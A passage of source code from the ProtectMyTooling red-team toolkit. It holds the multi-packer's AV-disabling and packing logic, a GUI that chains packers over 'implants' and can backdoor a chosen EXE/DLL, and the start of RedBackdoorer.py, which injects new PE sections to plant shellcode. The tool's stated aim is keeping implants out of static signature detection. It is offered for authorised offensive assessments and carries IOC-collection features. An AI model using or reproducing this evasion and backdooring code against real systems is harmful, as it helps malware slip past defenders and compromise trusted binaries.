        #os.path.join(infile, '*.sys'),
    )

    outs = ()
    pref = options['packers'].replace(',', '-').lower() + '-'

    for pat in patterns:
        logger.info('Enumerating files in: {}'.format(pat))
        for file in glob.glob(pat):

            if os.path.isfile(file):
                outfile = os.path.join(outdir, pref + os.path.basename(file))

                try:
                    out = processFile(False, file, outfile)

                except Exception as e:
                    logger.err('Exception occured while processing "{}": {}'.format(
                        file, str(e)
                    ))

            # elif os.path.isdir(file):
            #    processDir(file, outdir)


def checkAv(options, logger):
    outstatus = -1

    logger.info("Checking AV status...")

    if 'check_av_command' in options.keys() and 'disable_av_command' in options.keys() \
            and 'enable_av_command' in options.keys() and options['check_av_command']:

        if len(options['check_av_command']) == 0 or len(options['enable_av_command']) == 0 or len(options['enable_av_command']) == 0:
            logger.info('Will not disable/enable AV due to a missing option: check_av_command/enable_av_command/enable_av_command')
            return outstatus

        if options['check_av_command'] == 'false':
            logger.info('Won\'t disable AV as requested.')
            return outstatus

        out = shell(logger, options['check_av_command'], timeout=10)
        logger.dbg('AV status before starting packers: "{}"'.format(str(out)))

        if out.lower() == 'false':
            logger.info('AV seemingly enabled.')
            outstatus = 1
        elif out.lower() == 'true':
            logger.info('AV seemingly disabled.')
            outstatus = 0
        else:
            logger.info('AV seemingly disabled, timed out or unknown response from checking command.')
            outstatus = 0
    else:
        return outstatus

    if 'check_av_command' in options.keys() and options['check_av_command'] and \
        len(options['check_av_command']) > 0 and options['check_av_command'] == 'false':
        return outstatus

    if outstatus == -1:
        logger.info('Unknown AV status.')

    return outstatus


def handleAv(options, logger, status):
    outstatus = -1

    if 'disable_av_command' not in options.keys() or not options['disable_av_command'] or \
            'enable_av_command' not in options.keys() or not options['enable_av_command']:
        logger.info(
            "No Enable/Disable AV commands were specified, skipping AV orchestration.")
        return outstatus

    if status == 0:
        outstatus = checkAv(options, logger)

        if outstatus == 1:
            logger.dbg('Disabling AV...')

            out = shell(logger, options['disable_av_command'], timeout=10)

            logger.dbg('AV disable command returned: "{}"'.format(str(out)))
            logger.info('AV should be disabled now. Waiting 5 seconds...')

            time.sleep(5.0)

        initialAvStatus = outstatus
        return outstatus

    elif status == 1:
        logger.dbg('Enabling AV in 5 seconds...')
        time.sleep(5.0)

        out = shell(logger, options['enable_av_command'], timeout=10)

        logger.dbg('AV enable command returned: "{}"'.format(str(out)))
        logger.info('AV should be enabled now.')

    else:
        logger.info('Unknown AV handle status.')
        return -1


@atexit.register
def reEnableAvAtExit():
    try:
        handleAv(options, logger, av_enable_status)

    except lib.utils.ShellCommandReturnedError as e:
        logger.error(
            "Error occured while trying to re-enable AV:\n{}".format(str(e)))


def banner():

    try:
        print(r'''
    ::::::::::.:::::::..      ...  :::::::::::.,::::::  .,-::::::::::::::::
     `;;;```.;;;;;;``;;;;  .;;;;;;;;;;;;;;;'''''';;;;'''''',;;;'````;;;;;;;;''''''
      `]]nnn]]' [[[,/[[[' ,[[     \[[,  [[     [[cccc [[[           [[
       $$$""    $$$$$$c   $$$,     $$$  $$     $$"""" $$$           $$
       888o     888b "88bo"888,_ _,88P  88,    888oo,_`88bo,__,o,   88,
    .  YMMMb :.-:.MM   ::-. "YMMMMMP"   MMM    """"YUMMM"YUMMMMMP"  MMM
    ;;,.    ;;;';;.   ;;;;'
    [[[[, ,[[[[, '[[,[[['
    $$$$$$$$"$$$   c$$"
    888 Y88" 888o,8P"`
    ::::::::::::mM...        ...     :::    :::::.    :::. .,-:::::/
    ;;;;;;;;''''''.;;;;;;;.  .;;;;;;;.  ;;;    ;;`;;;;,  `;;,;;-'````'
         [[   ,[[     \[[,[[     \[[,[[[    [[[ [[[[[. '[[[[   [[[[[[/
         $$   $$$,     $$$$$,     $$$$$'    $$$ $$$ "Y$c$"$$c.    "$$
         88,  "888,_ _,88"888,_ _,88o88oo,._888 888    Y88`Y8bo,,,o88o
         MMM    "YMMMMMP"  "YMMMMMP"""""YUMMMMM MMM     YM  `'YMUP"YMM
''')

    except:
        print('''

    :: ProtectMyTooling
''')


def main():
    global av_enable_status

    banner()

    print(r'''    Your Red Team implants will never again fell into static signatures.

    Multi-Packer that wraps around multitude of packers, protectors, shellcode loaders, encoders.
    Mariusz Banach / mgeeky '20-'23, <mb@binary-offensive.com>
    v{}
'''.format(VERSION))

    if not os.name == 'nt':
        print('[!] This script works only on Windows platforms.')

    if not init():
        return 1

    out = 0

    try:
        try:
            av_enable_status = handleAv(options, logger, 0)

        except lib.utils.ShellCommandReturnedError as e:
            logger.fatal(
                "Error occured while trying to disable AV:\n{}".format(str(e)))

        infile = os.path.abspath(options['infile'])
        outfile = os.path.abspath(options['outfile'])

        if infile == outfile:
            logger.fatal('Input file is the same as output file!')

        if os.path.isfile(infile):
            out = processFile(True, infile, outfile)

        elif os.path.isdir(infile):
            if not os.path.isdir(outfile):
                logger.fatal(
                    'If infile points to a directory to perform recursive sweep - so should be the outfile, an output directory where to place generated artefacts!')

            logger.info(
                'Infile is a directory. Working recursively on files stored there.')
            processDir(infile, outfile)

    except Exception as e:
        raise

    print(f'''
------------------
Friendly reminder:
    - If your produced binary crashes or doesn't run as expected - try using different packers chain.
         Packers don't guarantee stability of produced binaries, therefore ProtectMyTooling cannot as well.
    - While chaining, carefully match output->input payload formats according to what consecutive packer expects.
''')

    return out


if __name__ == '__main__':
    main()



================================================
FILE: ProtectMyToolingGUI.pyw
================================================
#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
# Author:
#   Mariusz Banach / mgeeky, '20-'23
#   <mb [at] binary-offensive.com>
#   https://mgeeky.tech
#

import time
import os
import sys
from turtle import title
import yaml
import random
import clipboard

from lib.utils import *
from lib.logger import Logger
from lib.packersloader import PackersLoader
from ProtectMyTooling import VERSION
from threading import Thread

import lib.optionsparser

import PySimpleGUI as sg

sg.theme("Dark")
font = ("Consolas", 8)
font2 = ("Consolas", 10)

phrases = (
    'with great power, comes great responsibility.',
    "don't detect tools, detect techniques",
    'to be used in ethical offensive assessments only!',
    'support hard-working open-source Offensive Security Tools developers :)',
    'be responsible - watermark and track your implants',
    'be responsible - collect your implants\'s IOCs'
)

packersChain = []

# https://stackoverflow.com/a/69064884


def runCommand(cmd, timeout=None, window=None):
    cwd = os.getcwd()

    try:
        p = cmd[0]
        if len(cmd) > 1:
            p = cmd[1]

        d = os.path.dirname(os.path.normpath(os.path.abspath(p)))
        if os.path.isdir(d):
            os.chdir(d)

        p = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        output = ''

        for line in p.stdout:
            line = line.decode(errors='replace' if (
                sys.version_info) < (3, 5) else 'ignore').rstrip()
            output += line
            print(line)

            if window:
                window.Refresh()
                window['-outputml-'].set_vscroll_position(1.0)

        retval = p.wait(timeout)

        window.set_title("Program completed.")
        print(f'''
--------------------------------------------------------------------------------------------------------
Program completed.
''')
        return (retval, output)

    finally:
        os.chdir(cwd)



#
# https://stackoverflow.com/a/67860031
#
right_click_menu_ro = ['', ['Copy', 'Select All']]
right_click_menu = ['', ['Copy', 'Paste', 'Select All', 'Cut']]

def multilineRightClick(window, event, multilineKey, readOnly = False):
    mline: sg.Multiline = window[multilineKey]

    if event == 'Select All':
        mline.Widget.selection_clear()
        mline.Widget.tag_add('sel', '1.0', 'end')

    elif event == 'Copy':
        try:
            text = mline.Widget.selection_get()
            window.TKroot.clipboard_clear()
            window.TKroot.clipboard_append(text)
        except:
            pass

    elif event == 'Paste':
        if not readOnly:
            try:
                mline.Widget.delete("sel.first", "sel.last")
            except:
                pass
            mline.Widget.insert("insert", clipboard.paste())

    elif event == 'Cut':
        if not readOnly:
            try:
                text = mline.Widget.selection_get()
                window.TKroot.clipboard_clear()
                window.TKroot.clipboard_append(text)

                mline.Widget.delete("sel.first", "sel.last")

            except Exception as e:
                print(e)
                pass

def run(command, width=120):
    layout = [
        [
            sg.Multiline(
                size=(width, 40),
                key='-outputml-',
                font=font,
                echo_stdout_stderr=False,
                reroute_stdout=True,
                reroute_stderr=True,
                no_scrollbar=False,
                horizontal_scroll=True,
                right_click_menu=right_click_menu_ro,
                expand_x=True,
                expand_y=True,
            )
        ],
        [
            sg.Button("Close", key="-Exit-", font=font),
        ],
    ]

    window = sg.Window("Protection in progress...",
                       layout, modal=True, finalize=True, resizable=True, return_keyboard_events=True)

    window.bind("<Escape>", "-Exit-")

    print(f'PS> {" ".join(command)}\n')
    runCommand(cmd=command, window=window)

    while True:
        event, values = window.read()
        if event == "-Exit-" or event == sg.WIN_CLOSED or event == 'Escape:27':
            break

        multilineRightClick(window, event, '-outputml-', True)

    window.close()


def editConfig(config):
    layout = [
        [
            sg.Text(config, font=font),
        ],
        [
            sg.Multiline(
                size=(120, 40),
                font=font,
                echo_stdout_stderr=False,
                reroute_stdout=True,
                reroute_stderr=True,
                key='-yaml-',
                right_click_menu=right_click_menu,
                expand_x=True,
                expand_y=True,)
        ],
        [
            sg.Button("Save", key="-Save-", font=font),
            sg.Button("Close", key="-Exit-", font=font),
        ],
    ]

    window = sg.Window("Protection in progres...", layout,
                       modal=True, finalize=True, return_keyboard_events=True, resizable=True)
    window.bind("<Escape>", "-Exit-")

    with open(config) as f:
        print(f.read())

    while True:
        event, values = window.read()
        if event == "-Exit-" or event == sg.WIN_CLOSED or event == 'Escape:27':
            break

        if event == "-Save-":
            with open(config, 'w') as f:
                f.write(values['-yaml-'])

            sg.Popup('Saved.', 'YAML saved.')

        multilineRightClick(window, event, '-yaml-', False)

    window.close()


def createWindow(packersList):
    global packersChain

    tooltip1 = 'Inject watermark to generated artifact. Syntax: where=value, e.g.: "dos-stub=Foobar".\nAvailable watermarks: dos-stub,checksum,overlay,section\nSection requires NAME,STR syntax where NAME denotes PE section name\ne.g. "section=.foo,bar" creates PE section named ".foo" with contents "bar".\nMay be repeated'
    tooltip2 = 'Specify a custom IOC value that is to be written into output IOCs csv file in column "comment"'

    params_column = [
        [
            sg.Text("Input File" + ' ' * 1, font=font,
                    tooltip='Input implant file to be obfuscated/protected'),
            sg.Input(size=(60, 1), enable_events=True, key="-infile-", font=font,
                     tooltip='Input implant file to be obfuscated/protected', expand_x=True,),
            sg.FileBrowse(font=font),
        ],
        [
            sg.Text("Output File", font=font,
                    tooltip='Output obfuscated/protected file.'),
            sg.Input(size=(60, 1), enable_events=True, key="-outfile-",
                     font=font, tooltip='Output obfuscated/protected file.', expand_x=True,),
            sg.FileSaveAs(font=font),
        ],
        [
            sg.Text("File Architecture" + ' ' * 1, font=font,
                    tooltip='Specify input file architecture, or leave "Auto" to make script auto detect it.'),
            sg.Combo(size=(10, 1), values=["Auto", "x86", "x64"], readonly=True,
                     default_value="Auto", enable_events=True, key="-arch-", font=font,),
            sg.Text("Detected file type: ", font=font),
            sg.Text("", font=font, key='-detected-', text_color='cyan'),
        ],
        [
            sg.Column([
                [
                    sg.Listbox(values=packersChain, enable_events=True, size=(
                        25, 15), pad=(5, 5), key="-packers chain-", font=font2, expand_x=True, expand_y=True,),
                ]
            ], expand_x=True, expand_y=True,),
            sg.Column([
                [sg.Text("", font=font2)],
                [sg.Text("<-- Packers chain", font=font2)],
                [sg.Text("", font=font2)],
                [sg.Button("Move Up", font=font), ],
                [sg.Button("Move Down", font=font), ],
                [sg.Button("Remove", font=font), ],
                [sg.Button("Clear", font=font), ],
            ], expand_x=True, expand_y=True,),
        ],
        [
            sg.Text("Config path" + ' ' * 3, font=font),
            sg.Input(size=(61, 1), default_text=os.path.abspath(os.path.join(os.path.dirname(
                __file__), "config/ProtectMyTooling.yaml")), enable_events=True, key="-config-", font=font, expand_x=True,),
            sg.FileBrowse(font=font),
        ],
        [
            sg.Text("Watermark" + ' ' * 5, font=font, tooltip=tooltip1),
            sg.Input(size=(70, 1), default_text="section=.foo,1234567890abcdef123456", pad=(
                5, 5), enable_events=True, key="-watermark-", font=font, tooltip=tooltip1, expand_x=True,),
        ],
        [
            sg.Text("Custom IOC" + ' ' * 4, font=font, tooltip=tooltip2),
            sg.Input(size=(70, 1), default_text="", pad=(
                5, 5), enable_events=True, key="-customioc-", font=font, tooltip=tooltip2, expand_x=True,),
        ],
        [
            sg.Text("Custom Options" + ' ' * 0, font=font,
                    tooltip='Specify your own custom ProtectMyTooling options to be added to command line.'),
            sg.Input(size=(70, 1), default_text="", pad=(5, 5), enable_events=True, key="-customopts-", font=font,
                     tooltip='Specify your own custom ProtectMyTooling options to be added to command line.', expand_x=True,),
        ],
        [
            sg.Text("File to backdoor" + ' ' * 0, font=font,
                    tooltip='You can backdoor specific EXE/DLL file by providing path to it here AND choosing BACKDOORER packer in the chain'),
            sg.Input(size=(70, 1), default_text="", pad=(5, 5), enable_events=True, key="-backdoor-", font=font,
                     tooltip='You can backdoor specific EXE/DLL file by providing path to it here AND choosing BACKDOORER packer in the chain', expand_x=True,),
        ],
        [
            sg.Checkbox('Collect IOCs', key='-Collect IOCs-', text_color='cyan', default=False,
                        tooltip="Collect IOCs and save them to .csv file side by side to <outfile>", font=font),
            sg.Checkbox('Hide Console', key='-Hide Console-', default=False,
                        tooltip="If output artifact is PE EXE, use this option to hide Console window by switching PE Subsystem from WINDOWS_GUI", font=font),
            sg.Checkbox("Don't disable AV", key='-dont-disable-av-', default=False, font=font),
            sg.Checkbox('Verbose', key='-Verbose-', default=True, font=font),
            sg.Checkbox('Debug', key='-Debug-', default=False, font=font)
        ]
    ]

    packers_column = [
        [
            sg.Text("Choose packers to work with:", font=font),
        ],
        [
            sg.Listbox(values=packersList, enable_events=True, size=(
                20, 30), pad=(5, 5), key="-packers available-", font=font, expand_x=True, expand_y=True),
        ],
        [
            sg.Button("Add to chain", font=font, expand_x=True,),
        ]
    ]

    layout = [
        [
            sg.Column(params_column, expand_x=True, expand_y=True,),
            sg.VSeparator(),
            sg.Column(packers_column, expand_x=True, expand_y=True,),
        ],
        [
            sg.HSeparator(),
        ],
        [
            sg.Text("", key='-current chain-', font=font2),
        ],
        [
            sg.Text("", font=font),
        ],
        [
            sg.Button(
                "Protect", tooltip="Runs ProtectMyTooling.py with provided arguments.", font=font),
            sg.Button(
                "Protect & Run", tooltip="Protects input payload and runs protected file without parameters.", font=font),
            sg.Button("List Packers & Details",
                      tooltip="List all packers details.", font=font),
            sg.Button("Edit Config",
                      tooltip="Edit configuration YAML contents.", font=font),
            sg.Button("Full Help", font=font),
            sg.Button("About", font=font),
        ]
    ]

    phrase = random.choice(phrases)
    window = sg.Window(f"ProtectMyTooling v{VERSION} | {phrase} ",
                       layout, return_keyboard_events=True, resizable=True, finalize=True)
    window.bind("<Escape>", "-Exit-")

    return window


def detectFileType(p, window, values):
    global packersChain

    ftype = 'unkown'

    if os.path.isfile(p):
        if isDotNetExecutable(p):
            window['-detected-'].update('.NET Assembly')
            ftype = 'dotnet'
        elif isValidPE(p):
            window['-detected-'].update('PE Executable')
            ftype = 'pe'
        elif isShellcode(p):
            window['-detected-'].update('Shellcode')
            ftype = 'shellcode'
        else:
            window['-detected-'].update('Unknown')

    if len(values['-config-']) > 0 and os.path.isfile(values['-config-']):
        try:
            with open(values['-config-']) as f:
                parsed = yaml.load(f, Loader=yaml.FullLoader)

            if ftype == 'pe':
                packersChain = [
                    [x] for x in parsed['gui_default_chain_pe'].replace(' ', '').split(',')]
            if ftype == 'dotnet':
                packersChain = [
                    [x] for x in parsed['gui_default_chain_dotnet'].replace(' ', '').split(',')]
            if ftype == 'shellcode':
                packersChain = [
                    [x] for x in parsed['gui_default_chain_shellcode'].replace(' ', '').split(',')]

            index = 0
            window["-packers chain-"].update(packersChain, set_to_index=[
                                             index + 1], scroll_to_index=index + 1)

            chain = f'"{os.path.basename(values["-infile-"])}"'
            for p in packersChain:
                chain = f"{p[0].capitalize()}({chain})"
            window['-current chain-'].update(chain)

        except:
            pass


def main():
    global packersChain
    packersList = []

    files = os.listdir(os.path.join(os.path.dirname('__file__'), 'packers'))

    for f in files:
        if f.lower().endswith('.py'):
            name = os.path.basename(f).replace('.py', '')

            if name.lower() not in ['__init__', 'ipacker']:
                if name in RenamePackerNameToPackerFile.values():
                    name = list(RenamePackerNameToPackerFile.keys())[list(RenamePackerNameToPackerFile.values()).index(name)]

                packersList.append(name)

    window = createWindow(packersList)

    while True:
        event, values = window.read()
        if event == "Exit" or event == sg.WIN_CLOSED:
            break

        elif event == "Add to chain":
            packersChain.append(values['-packers available-'])
            chain = f'"{os.path.basename(values["-infile-"])}"'
            for p in packersChain:
                chain = f"{p[0].capitalize()}({chain})"

            window['-current chain-'].update(chain)
            window["-packers chain-"].update(packersChain)

            chain = f'"{os.path.basename(values["-infile-"])}"'
            for p in packersChain:
                chain = f"{p[0].capitalize()}({chain})"

            window['-current chain-'].update(chain)

        elif event == "Remove":
            index = int(
                ''.join(map(str, window["-packers chain-"].get_indexes())))
            packersChain.pop(index)

            chain = f'"{os.path.basename(values["-infile-"])}"'
            for p in packersChain:
                chain = f"{p[0].capitalize()}({chain})"

            window['-current chain-'].update(chain)
            window["-packers chain-"].update(packersChain, set_to_index=[
                                             index - 1], scroll_to_index=index - 1)

        elif event == "Clear":
            packersChain.clear()
            window['-current chain-'].update("")
            window["-packers chain-"].update(packersChain)

        elif event == "List Packers & Details":
            script = os.path.abspath(os.path.join(
                os.path.dirname(__file__), 'ProtectMyTooling.py'))

            with tempfile.NamedTemporaryFile() as temp:
                logpath = temp.name + ".log"
                command = [
                    sys.executable,
                    script,
                    '-L',
                    '--widest-packers-list'
                ]

                run(command, width=150)

        elif event == "Move Up":
            index = int(
                ''.join(map(str, window["-packers chain-"].get_indexes())))

            if index > 0:
                packersChain.insert(index - 1, packersChain.pop(index))
                window["-packers chain-"].update(packersChain, set_to_index=[
                                                 index - 1], scroll_to_index=index - 1)

                chain = f'"{os.path.basename(values["-infile-"])}"'
                for p in packersChain:
                    chain = f"{p[0].capitalize()}({chain})"
                window['-current chain-'].update(chain)

        elif event == "Move Down":
            index = int(
                ''.join(map(str, window["-packers chain-"].get_indexes())))

            if index + 1 < len(packersChain):
                packersChain.insert(index + 1, packersChain.pop(index))
                window["-packers chain-"].update(packersChain, set_to_index=[
                                                 index + 1], scroll_to_index=index + 1)

                chain = f'"{os.path.basename(values["-infile-"])}"'
                for p in packersChain:
                    chain = f"{p[0].capitalize()}({chain})"
                window['-current chain-'].update(chain)

        elif event == "About":
            sg.Popup("About ProtectMyTooling", f'''

Mariusz Banach / mgeeky, '20-'23
<mb [at] binary-offensive.com>
(https://mgeeky.tech)

------------------------------------------------------------
This and other projects are outcome of sleepless nights and
plenty of hard work. If you like what I do and appreciate
that I always give back to the community, Consider buying
me a coffee (or better a beer) just to say thank you! :-)

https://github.com/sponsors/mgeeky

------------------------------------------------------------

Use only for legitimate, ethical engagements.

Enjoy!
''', font=font)

        elif event == "-infile-":
            p = os.path.normpath(os.path.abspath(values["-infile-"]))
            path, ext = os.path.splitext(p)
            newname = os.path.basename(path) + '-obf' + ext
            window["-infile-"].update(p)

            if len(values["-outfile-"]) == 0:
                outpath = os.path.normpath(os.path.abspath(
                    os.path.join(os.path.dirname(p), newname)))
                window["-outfile-"].update(outpath)

            #thread = Thread(target = detectFileType, args = (p, window, values))
            # thread.start()
            detectFileType(p, window, values)

        elif event == "Edit Config":
            if len(values["-config-"]) > 0:
                editConfig(values["-config-"])

        elif 'Up' in event or '16777235' in event:
            element = window.find_element_with_focus().Key

            if element in ['-packers chain-', '-packers available-']:
                cur_index = window.Element(element).Widget.curselection()
                cur_index = (
                    cur_index[0] - 1) % window.Element(element).Widget.size()
                window.Element(element).Update(set_to_index=cur_index)
                window.Element(element).Update(scroll_to_index=cur_index)
                window.write_event_value(
                    element, [window.Element(element).GetListValues()[cur_index]])

        elif 'Down' in event or '16777237' in event:
            element = window.find_element_with_focus().Key

            if element in ['-packers chain-', '-packers available-']:
                cur_index = window.Element(element).Widget.curselection()
                cur_index = (
                    cur_index[0] + 1) % window.Element(element).Widget.size()
                window.Element(element).Update(set_to_index=cur_index)
                window.Element(element).Update(scroll_to_index=cur_index)
                window.write_event_value(
                    element, [window.Element(element).GetListValues()[cur_index]])

        elif event == "Full Help":
            script = os.path.abspath(os.path.join(
                os.path.dirname(__file__), 'ProtectMyTooling.py'))
            command = [
                sys.executable,
                script,
                '-h',
                '-v',
                '-C',
            ]
            run(command)

        elif event == "Protect" or event == "Protect & Run":
            infile = os.path.normpath(os.path.abspath(values["-infile-"]))
            arch = values["-arch-"]
            watermark = values["-watermark-"]
            config = values["-config-"]
            customioc = values["-customioc-"]
            outfile = os.path.normpath(os.path.abspath(values["-outfile-"]))
            packers = ','.join([x[0] for x in packersChain])

            with tempfile.NamedTemporaryFile() as temp:
                logpath = temp.name + ".log"

                script = os.path.abspath(os.path.join(
                    os.path.dirname(__file__), 'ProtectMyTooling.py'))

                command = [
                    sys.executable,
                    script,
                    '-c',
                    config,
                    packers,
                    '-l',
                    logpath,
                    '-C',
                    infile,
                    outfile
                ]

                if arch.lower() != 'auto':
                    command.extend(['--arch', arch, ])
                if len(watermark) > 0:
                    command.extend(['-w', watermark])
                if len(customioc) > 0:
                    command.extend(['-I', customioc])

                if values['-Collect IOCs-']:
                    command.append('-i')
                if values['-Hide Console-']:
                    command.append('-g')
                if values['-Verbose-']:
                    command.append('-v')
                if values['-Debug-']:
                    command.append('-d')
                if values['-dont-disable-av-']:
                    command.extend([
                        '--check-av-command',
                        'false'
                    ])

                if len(values["-backdoor-"]) > 0:
                    backdoor = values["-backdoor-"]
                    fname, ext = os.path.splitext(backdoor.lower())

                    if ext not in ('.exe', '.dll', '.cpl', '.xll', '.wll', '.ocx', '.sys'):
                        sg.Popup("File to be backdoored must be a valid PE executable: EXE/DLL/CPL/XLL/WLL/OCX/SYS and input file must be shellcode.")
                        continue

                    command.append(f'-B')
                    command.append(backdoor.strip())

                    if 'backdoor' not in [x[0].lower() for x in window["-packers chain-"].get_list_values()]:
                        sg.Popup("You did not select \"backdoor\" packer in your packers chain!")
                        continue

                if len(values["-customopts-"]) > 0:
                    opts = values["-customopts-"]
                    pos = 0
                    failed = False

                    while pos < len(opts):
                        if opts[pos] == '"':
                            pos2 = opts.find('"', pos + 1)
                            if pos2 == 0:
                                sg.Popup("Missing \" (quote) character in custom options!")
                                failed = True
                                break

                            c = opts[pos + 1:pos2]
                            command.append(c.strip())
                            pos = pos2 + 1
                        else:
                            pos2 = opts.find(' ', pos + 1)
                            if pos2 > 0:
                                c = opts[pos:pos2]
                                command.append(c.strip())
                                pos = pos2 + 1
                            else:
                                c = opts[pos:]
                                command.append(c.strip())
                                break

                    if failed:
                        continue

                if event == "Protect & Run":
                    command.append('-r')

                if os.path.isfile(outfile):
                    os.remove(outfile)

                run(command)

    window.close()


if __name__ == '__main__':
    main()



================================================
FILE: RedBackdoorer.py
================================================
#!/usr/bin/python3
#
# Author:
#     Mariusz Banach / mgeeky '22-'23, (@mariuszbit)
#     <mb@binary-offensive.com>
#
# Requirements:
#   - pefile
#   - capstone
#   - keystone
#

import os, re, sys
import string
import shutil
import random
import tempfile
import argparse
import textwrap
import struct
import pefile
import capstone
import keystone
from enum import IntEnum


options = {
    'verbose' : False,
    'mode' : '',
    'section_name' : '',
    'ioc' : '',
    'remove_signature' : False
}

DefaultSectionName = '.' + ''.join(random.choice(string.ascii_lowercase) for i in range(random.randint(4, 6)))

class Logger:
    def fatal(txt):
        print('[!] ' + txt)
        sys.exit(1)

    def info(txt):
        print('[.] ' + txt)

    def err(txt):
        print('[-] ' + txt)

    def ok(txt):
        print('[+] ' + txt)

    def dbg(txt):
        if options['verbose']:
            print('[>] ' + txt)

#
# Source:
#   https://github.com/joxeankoret/tahh/blob/master/evasion/SectionDoubleP.py
#

class SectionDoublePError(Exception):
    pass

class SectionDoubleP:
    def __init__(self, pe):
        self.pe = pe

    def __adjust_optional_header(self):
        """ Recalculates the SizeOfImage, SizeOfCode, SizeOfInitializedData and
            SizeOfUninitializedData of the optional header.
        """

        # SizeOfImage = ((VirtualAddress + VirtualSize) of the new last section)
        self.pe.OPTIONAL_HEADER.SizeOfImage = (self.pe.sections[-1].VirtualAddress +
                                                self.pe.sections[-1].Misc_VirtualSize)

        self.pe.OPTIONAL_HEADER.SizeOfCode = 0
        self.pe.OPTIONAL_HEADER.SizeOfInitializedData = 0
        self.pe.OPTIONAL_HEADER.SizeOfUninitializedData = 0

        # Recalculating the sizes by iterating over every section and checking if
        # the appropriate characteristics are set.
        for section in self.pe.sections:
            if section.Characteristics & 0x00000020:
                # Section contains code.
                self.pe.OPTIONAL_HEADER.SizeOfCode += section.SizeOfRawData
            if section.Characteristics & 0x00000040:
                # Section contains initialized data.
                self.pe.OPTIONAL_HEADER.SizeOfInitializedData += section.SizeOfRawData
            if section.Characteristics & 0x00000080:
                # Section contains uninitialized data.
                self.pe.OPTIONAL_HEADER.SizeOfUninitializedData += section.SizeOfRawData

    def __add_header_space(self):
        """ To make space for a new section header a buffer filled with nulls is added at the
            end of the headers. The buffer has the size of one file alignment.
            The data between the last section header and the end of the headers is copied to
            the new space (everything moved by the size of one file alignment). If any data
            directory entry points to the moved data the pointer is adjusted.
        """

        FileAlignment = self.pe.OPTIONAL_HEADER.FileAlignment
        SizeOfHeaders = self.pe.OPTIONAL_HEADER.SizeOfHeaders

        data = b'\x00' * FileAlignment

        # Adding the null buffer.
        self.pe.__data__ = (self.pe.__data__[:SizeOfHeaders] + data +
                            self.pe.__data__[SizeOfHeaders:])

        section_table_offset = (self.pe.DOS_HEADER.e_lfanew + 4 +
                        self.pe.FILE_HEADER.sizeof() + self.pe.FILE_HEADER.SizeOfOptionalHeader)

        # Copying the data between the last section header and SizeOfHeaders to the newly allocated
        # space.
        new_section_offset = section_table_offset + self.pe.FILE_HEADER.NumberOfSections*0x28
        size = SizeOfHeaders - new_section_offset
        data = self.pe.get_data(new_section_offset, size)
        self.pe.set_bytes_at_offset(new_section_offset + FileAlignment, data)

        # Filling the space, from which the data was copied from, with NULLs.
        self.pe.set_bytes_at_offset(new_section_offset, b'\x00' * FileAlignment)

        data_directory_offset = section_table_offset - self.pe.OPTIONAL_HEADER.NumberOfRvaAndSizes * 0x8

        # Checking data directories if anything points to the space between the last section header
        # and the former SizeOfHeaders. If that's the case the pointer is increased by FileAlignment.
        for data_offset in range(data_directory_offset, section_table_offset, 0x8):
            data_rva = self.pe.get_dword_from_offset(data_offset)

            if new_section_offset <= data_rva and data_rva < SizeOfHeaders:
                self.pe.set_dword_at_offset(data_offset, data_rva + FileAlignment)

        SizeOfHeaders_offset = (self.pe.DOS_HEADER.e_lfanew + 4 +
                        self.pe.FILE_HEADER.sizeof() + 0x3C)

        # Adjusting the SizeOfHeaders value.
        self.pe.set_dword_at_offset(SizeOfHeaders_offset, SizeOfHeaders + FileAlignment)

        section_raw_address_offset = section_table_offset + 0x14

        # The raw addresses of the sections are adjusted.
        for section in self.pe.sections:
            if section.PointerToRawData != 0:
                self.pe.set_dword_at_offset(section_raw_address_offset, section.PointerToRawData+FileAlignment)

            section_raw_address_offset += 0x28

        # All changes in this method were made to the raw data (__data__). To make these changes
        # accessbile in self.pe __data__ has to be parsed again. Since a new pefile is parsed during
        # the init method, the easiest way is to replace self.pe with a new pefile based on __data__
        # of the old self.pe.
        self.pe = pefile.PE(data=self.pe.__data__)

    def __is_null_data(self, data):
        """ Checks if the given data contains just null bytes.
        """

        for char in data:
            if char != b'\x00':
                return False
        return True

    def pop_back(self):
        """ Removes the last section of the section table.
            Deletes the section header in the section table, the data of the section in the file,
            pops the last section in the sections list of pefile and adjusts the sizes in the
            optional header.
        """

        # Checking if there are any sections to pop.
        if (    self.pe.FILE_HEADER.NumberOfSections > 0
            and self.pe.FILE_HEADER.NumberOfSections == len(self.pe.sections)):

            # Stripping the data of the section from the file.
            if self.pe.sections[-1].SizeOfRawData != 0:
                self.pe.__data__ = (self.pe.__data__[:self.pe.sections[-1].PointerToRawData] + \
                                    self.pe.__data__[self.pe.sections[-1].PointerToRawData + \
                                                        self.pe.sections[-1].SizeOfRawData:])

            # Overwriting the section header in the binary with nulls.
            # Getting the address of the section table and manually overwriting
            # the header with nulls unfortunally didn't work out.
            self.pe.sections[-1].Name = b'\x00'*8
            self.pe.sections[-1].Misc_VirtualSize = 0x00000000
            self.pe.sections[-1].VirtualAddress = 0x00000000
            self.pe.sections[-1].SizeOfRawData = 0x00000000
            self.pe.sections[-1].PointerToRawData = 0x00000000
            self.pe.sections[-1].PointerToRelocations = 0x00000000
            self.pe.sections[-1].PointerToLinenumbers = 0x00000000
            self.pe.sections[-1].NumberOfRelocations = 0x0000
            self.pe.sections[-1].NumberOfLinenumbers = 0x0000
            self.pe.sections[-1].Characteristics = 0x00000000

            self.pe.sections.pop()
            self.pe.FILE_HEADER.NumberOfSections -=1

            section_table_offset = (self.pe.DOS_HEADER.e_lfanew + 4 +
                self.pe.FILE_HEADER.sizeof() + self.pe.FILE_HEADER.SizeOfOptionalHeader)
            self.pe.parse_sections(section_table_offset)

            assert len(self.pe.sections) == self.pe.FILE_HEADER.NumberOfSections

            self.__adjust_optional_header()
        else:
            raise SectionDoublePError("There's no section to pop.")

    def push_back(self, Name=b".NewSec", VirtualSize=0x00000000, VirtualAddress=0x00000000,
                RawSize=0x00000000, RawAddress=0x00000000, RelocAddress=0x00000000,
                Linenumbers=0x00000000, RelocationsNumber=0x0000, LinenumbersNumber=0x0000,
                Characteristics=0xE00000E0, Data=b""):
        """ Adds the section, specified by the functions parameters, at the end of the section
            table.
            If the space to add an additional section header is insufficient, a buffer is inserted
            after SizeOfHeaders. Data between the last section header and the end of SizeOfHeaders
            is copied to +1 FileAlignment. Data directory entries pointing to this data are fixed.

            A call with no parameters creates the same section header as LordPE does. But for the
            binary to be executable without errors a VirtualSize > 0 has to be set.

